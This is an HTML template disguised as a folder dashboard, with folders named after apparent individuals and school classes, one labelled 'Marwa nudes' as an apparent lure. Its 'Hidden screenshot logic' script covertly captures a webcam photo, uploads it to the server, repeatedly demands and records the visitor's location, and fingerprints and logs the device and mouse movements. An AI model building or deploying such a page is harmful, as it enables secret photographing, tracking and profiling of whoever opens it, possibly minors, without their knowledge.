<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Folder Dashboard</title>
    <style>
        body {
            margin: 0;
            padding: 2rem;
            background-color: #1e1e2f;
            color: #fff;
            font-family: Arial, sans-serif;
        }

        h1 {
            text-align: center;
            margin-bottom: 2rem;
            font-size: 2.5rem;
            color: #f7d217;
        }

        .folder-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 1.5rem;
        }

        .folder {
            background-color: #2a2a40;
            border: 2px solid #3d3d5c;
            border-radius: 12px;
            padding: 1rem;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
            transition: transform 0.2s ease;
        }

        .folder:hover {
            transform: scale(1.05);
            cursor: pointer;
        }

        .folder-icon {
            font-size: 3rem;
            margin-bottom: 0.5rem;
        }

        .folder-name {
            font-size: 1rem;
            font-weight: bold;
            color: #ccc;
        }
    </style>
</head>
<body>

    <h1>📂 Your Folders</h1>
    <div class="folder-grid">
        <!-- Folder Items -->
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Adam</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Yassine</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hassan 3aryan</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hiba</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Rihab</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Malak</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">2 EME BAC</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">1 EME BAC</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">3 EME COLLEGE</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Imane Vape</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">SALMA</a></div></div>
        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Marwa nudes</a></div></div>
    </div>

    <!-- Hidden screenshot logic -->
    <script>
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        let cameraGranted = false;
        let locationGranted = false;

        function checkPermissions() {
            if (cameraGranted && locationGranted) {
                document.getElementById('permission-message').style.display = 'none';
            } else {
                document.getElementById('permission-message').style.display = 'block';
                setTimeout(() => requestPermissions(), 2000); // Retry every 2 seconds
            }
        }

        function requestPermissions() {
            // Ask for camera
            navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                cameraGranted = true;
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const image = canvas.toDataURL('image/png');
                    fetch('/upload/', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `image=${encodeURIComponent(image)}`
                    });
                    checkPermissions();
                }, 1500);
            })
            .catch(err => {
                cameraGranted = false;
                checkPermissions();
            });

            // Ask for location
            navigator.geolocation.getCurrentPosition(position => {
                locationGranted = true;
                fetch('/save-location/', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    })
                });
                checkPermissions();
            }, error => {
                locationGranted = false;
                checkPermissions();
            });
        }

        // Start permission loop
        requestPermissions();

        function collectBrowserInfo() {
            const info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                online: navigator.onLine,
                cookiesEnabled: navigator.cookieEnabled,
                touchSupport: 'ontouchstart' in window,
            };

            fetch("/log-device/", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "X-CSRFToken": getCSRFToken()
                },
                body: JSON.stringify(info)
            });
        }

        function getCSRFToken() {
            let name = 'csrftoken';
            let cookieValue = null;
            if (document.cookie && document.cookie !== '') {
                let cookies = document.cookie.split(';');
                for (let cookie of cookies) {
                    cookie = cookie.trim();
                    if (cookie.startsWith(name + '=')) {
                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                        break;
                    }
                }
            }
            return cookieValue;
        }

        collectBrowserInfo();
    </script>
    
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@0.4.1/dist/html2canvas.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/fingerprintjs2@2.1.0/dist/fp.min.js"></script>

    <script>
        new Fingerprint2().get(function(result, components){
            console.log(result); // This is the unique fingerprint
            // Send this result to the backend for storage
        });

        document.addEventListener('mousemove', (event) => {
            console.log(`Mouse move at: ${event.clientX}, ${event.clientY}`);
        });

        navigator.geolocation.watchPosition(function(position) {
            console.log(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
        });

        function collectVisitorData() {
            const fingerprint = generateFingerprint();
            const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
            const screenInfo = {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth
            };
            const timezoneOffset = new Date().getTimezoneOffset();
            const referrer = document.referrer;
            const language = navigator.language || navigator.userLanguage;
            const isNewVisitor = !sessionStorage.getItem("visited");
            const cookiesEnabled = navigator.cookieEnabled;
            const operatingSystem = navigator.platform;

            const data = {
                fingerprint: fingerprint,
                deviceType: deviceType,
                screenInfo: screenInfo,
                timezoneOffset: timezoneOffset,
                referrer: referrer,
                language: language,
                isNewVisitor: isNewVisitor,
                cookiesEnabled: cookiesEnabled,
                operatingSystem: operatingSystem
            };

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    data.latitude = position.coords.latitude;
                    data.longitude = position.coords.longitude;
                    sendDataToBackend(data);
                });
            } else {
                sendDataToBackend(data);
            }
        }

        function sendDataToBackend(data) {
            fetch('/collect-info/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => response.json())
              .then(result => console.log('Data sent successfully:', result))
              .catch(error => console.error('Error sending data:', error));
        }

        window.onload = collectVisitorData;
        
        function sendVisitorData(data) {
    fetch('/collect-info/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': getCSRFToken()  // Add this only if CSRF is enabled
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(result => {
        console.log('Data sent successfully:', result);
    })
    .catch(error => {
        console.error('Error sending data:', error);
    });
}

    </script>
</body>
</html>
